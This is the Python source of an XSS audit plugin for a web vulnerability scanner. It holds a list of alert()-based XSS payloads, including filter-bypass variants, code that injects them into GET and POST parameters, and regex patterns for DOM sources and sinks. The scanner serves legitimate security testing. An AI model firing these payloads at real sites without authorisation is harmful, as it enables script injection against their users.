"""Cross-Site Scripting (XSS) audit plugin — detects reflected and DOM-based XSS.

Tests both GET and POST parameters with various encoding techniques.
Detects reflection in HTML, attributes, JavaScript, and URL contexts.
"""

from __future__ import annotations

import asyncio
import html
import random
import re
import string
from typing import Any
from urllib.parse import quote, quote_plus

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine
from xfweb.core.data.parsers.param_extractor import extract_params

logger = structlog.get_logger()

XSS_PAYLOADS = [
    # Script-based
    ("<script>alert('xfweb')</script>", "script_tag"),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "script_charcode"),
    # Event handlers
    ('<img src=x onerror="alert(1)">', "img_onerror"),
    ('<svg onload="alert(1)">', "svg_onload"),
    ('<body onload="alert(1)">', "body_onload"),
    ('<input onfocus="alert(1)" autofocus>', "input_onfocus"),
    ('<details open ontoggle="alert(1)">', "details_toggle"),
    ('<marquee onstart="alert(1)">', "marquee_onstart"),
    ('<video><source onerror="alert(1)">', "video_onerror"),
    # SVG/Math
    ('<svg><animate onbegin="alert(1)" attributeName="x" dur="1s">', "svg_animate"),
    # Iframe
    ('<iframe src="javascript:alert(1)">', "iframe_js"),
    # JavaScript URI
    ("javascript:alert(1)", "javascript_uri"),
    # Template/polyglot
    ('"><img src=x onerror=alert(1)>', "polyglot_attr"),
    ("'-alert(1)-'", "js_breakout"),
    ("javascript:alert(1)//", "js_comment"),
    # Encoding bypass
    ("%3Cscript%3Ealert(1)%3C/script%3E", "url_encoded"),
    ("&#60;script&#62;alert(1)&#60;/script&#62;", "html_entity"),
    ("<scr\x00ipt>alert(1)</script>", "null_byte"),
    ("<SCRIPT>alert(1)</SCRIPT>", "uppercase"),
    ("<scr<script>ipt>alert(1)</scr</script>ipt>", "nested"),
    ("<img/src=x onerror=alert(1)>", "space_slash"),
]

DOM_SOURCES = [
    re.compile(r"document\.(URL|documentURI|baseURI)", re.IGNORECASE),
    re.compile(r"document\.URL", re.IGNORECASE),
    re.compile(r"document\.cookie", re.IGNORECASE),
    re.compile(r"location\.(href|search|hash|pathname)", re.IGNORECASE),
    re.compile(r"window\.name", re.IGNORECASE),
    re.compile(r"document\.referrer", re.IGNORECASE),
    re.compile(r"postMessage", re.IGNORECASE),
]

DOM_SINKS = [
    re.compile(r"eval\s*\(", re.IGNORECASE),
    re.compile(r"setTimeout\s*\(", re.IGNORECASE),
    re.compile(r"setInterval\s*\(", re.IGNORECASE),
    re.compile(r"document\.write\s*\(", re.IGNORECASE),
    re.compile(r"innerHTML\s*=", re.IGNORECASE),
    re.compile(r"outerHTML\s*=", re.IGNORECASE),
    re.compile(r"\.html\s*\(", re.IGNORECASE),
    re.compile(r"\.append\s*\(", re.IGNORECASE),
    re.compile(r"location\s*=", re.IGNORECASE),
    re.compile(r"window\.open\s*\(", re.IGNORECASE),
]


class XssPlugin(AuditPlugin):
    """Cross-Site Scripting vulnerability detector — reflected, stored, and DOM-based."""

    plugin_name = "xss"
    brief_description = "Detect reflected and DOM-based XSS vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if params:
            tasks = []
            for param_name, param_value in params.items():
                tasks.append(self._test_param(freq, param_name, param_value, http))
            await asyncio.gather(*tasks, return_exceptions=True)

        if freq.method.upper() == "GET":
            await self._check_dom_sources(freq, http)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        return extract_params(freq)

    async def _test_param(self, freq: Any, param_name: str, param_value: str, http: HttpEngine) -> None:
        marker = "".join(random.choices(string.ascii_lowercase, k=10))

        for payload, ptype in XSS_PAYLOADS:
            test_value = f"{marker}{payload}"

            resp = await self._inject(freq, param_name, param_value, test_value, http)
            if resp.status_code == 0 or not resp.is_text:
                continue

            if marker in resp.text:
                if payload in resp.text or html.escape(payload) in resp.text:
                    context = self._determine_context(resp.text, marker, payload)
                    self.report_finding(
                        name=f"Reflected XSS ({ptype}) in '{param_name}'",
                        severity="high" if ptype != "javascript_uri" else "critical",
                        url=freq.url.raw_url,
                        description=f"Reflected XSS vulnerability detected. User input in parameter "
                        f"'{param_name}' is reflected in the response without proper sanitization. "
                        f"Payload type: {ptype}, context: {context}.",
                        parameter=param_name,
                        evidence=f"Payload: {payload}\nMarker: {marker}\nContext: {context}\n"
                        f"Reflected in response body",
                        http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                        http_response={"status": resp.status_code, "body_excerpt": resp.text[:1000]},
                        remediation="Implement Content Security Policy (CSP). "
                        "HTML-encode all user input in output context. "
                        "Use context-aware output encoding (HTML, attribute, JS, URL). "
                        "Validate and sanitize input server-side.",
                    )
                    return

    async def _check_dom_sources(self, freq: Any, http: HttpEngine) -> None:
        """Check JavaScript on the page for DOM-based XSS sources and sinks."""
        resp = await http.get(freq.url.raw_url)
        if resp.status_code != 200 or not resp.is_text:
            return

        page_text = resp.text
        sources_found = []
        sinks_found = []

        for pattern in DOM_SOURCES:
            for match in pattern.finditer(page_text):
                sources_found.append(match.group())

        for pattern in DOM_SINKS:
            for match in pattern.finditer(page_text):
                sinks_found.append(match.group())

        if sources_found and sinks_found:
            self.report_finding(
                name=f"Potential DOM-based XSS on {freq.url.raw_url}",
                severity="medium",
                url=freq.url.raw_url,
                description=f"JavaScript on this page contains DOM XSS sources and sinks. "
                f"Sources: {', '.join(set(sources_found))}. "
                f"Sinks: {', '.join(set(sinks_found))}. "
                "Manual verification recommended.",
                evidence=f"DOM Sources: {list(set(sources_found))}\nDOM Sinks: {list(set(sinks_found))}",
                http_request={"method": "GET", "url": freq.url.raw_url},
                http_response={"status": resp.status_code},
                remediation="Audit JavaScript for DOM-based XSS. Avoid using innerHTML, "
                "document.write, and eval with user-controlled data.",
            )

    async def _inject(self, freq: Any, param: str, value: str, test_value: str, http: HttpEngine) -> Any:
        if freq.method.upper() == "POST" and freq.post_data:
            new_data = freq.post_data.replace(f"{param}={value}", f"{param}={test_value}")
            return await http.post(freq.url.raw_url, data=new_data)
        else:
            new_url = freq.url.raw_url.replace(f"{param}={value}", f"{param}={test_value}")
            return await http.get(new_url)

    def _determine_context(self, response_text: str, marker: str, payload: str) -> str:
        idx = response_text.find(marker)
        if idx == -1:
            return "unknown"
        before = response_text[max(0, idx - 50):idx]
        if "<script" in before.lower() or "javascript:" in before.lower():
            return "javascript"
        if before.rstrip().endswith('"') or before.rstrip().endswith("'"):
            return "attribute"
        if "<" in before:
            return "html_body"
        return "text"
